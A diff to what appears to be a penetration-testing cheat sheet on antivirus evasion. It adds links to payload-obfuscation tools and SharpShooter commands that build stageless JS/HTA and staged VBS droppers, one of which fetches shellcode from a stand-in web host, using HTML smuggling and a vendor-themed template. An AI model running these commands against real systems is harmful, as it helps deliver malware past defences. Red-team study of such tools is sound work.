@@ -204,6 +204,33 @@ https://github.com/l0ss/Grouper2
 
 {% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}
 
+## Other tools
+
+```bash
+# Veil Framework:
+https://github.com/Veil-Framework/Veil
+
+# Shellter
+https://www.shellterproject.com/download/
+
+# Sharpshooter
+# https://github.com/mdsecactivebreach/SharpShooter
+# Javascript Payload Stageless: 
+SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
+
+# Stageless HTA Payload: 
+SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
+
+# Staged VBS:
+SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
+
+# Donut: 
+https://github.com/TheWover/donut
+
+# Vulcan
+https://github.com/praetorian-code/vulcan
+```
+
 ## More
 
 {% embed url="https://github.com/EgeBalci/sgn" %}
